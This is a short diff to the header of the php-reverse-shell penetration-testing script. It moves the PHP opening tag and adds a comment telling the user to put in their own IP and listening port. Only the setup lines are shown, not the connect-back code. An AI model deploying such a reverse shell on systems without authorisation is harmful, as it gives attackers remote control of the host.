@@ -1,7 +1,11 @@
+<?php
+
 # php-reverse-shell - A Reverse Shell implementation in PHP
 # Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 
-<?php
+# Replace {IP} with your IP and set port to your listening port
+
+
 
 set_time_limit (0);
 $VERSION = "1.0";
